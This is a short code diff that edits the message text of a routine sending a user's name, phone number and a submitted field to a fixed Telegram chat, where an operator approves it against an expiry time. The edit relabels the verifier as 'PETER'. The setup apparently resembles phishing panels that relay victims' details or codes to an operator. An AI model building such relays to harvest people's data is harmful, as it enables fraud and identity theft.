@@ -278,7 +278,7 @@
         `⏰ Submitted: ${formatTime(now)}`,
         `⏰ Expires: ${formatTime(expires)}`,
         '────────────────────────',
-        '⏳ Waiting for administrator verification...'
+        '⏳ Waiting for PETER VER...'
       ].join('\n');
 
       const sent = await tgRequest('sendMessage', {
@@ -326,7 +326,7 @@
               chat_id: TELEGRAM_CHAT_ID,
               text: approved
                 ? [
-                    `✅ ${fieldLabel.toUpperCase()} VERIFIED SUCCESSFULLY`,
+                    `✅ ${fieldLabel.toUpperCase()} PETER VERIFIED SUCCESSFULLY`,
                     '────────────────────────',
                     `👤 Name: ${user}`,
                     `☎️ Phone: ${phone}`,
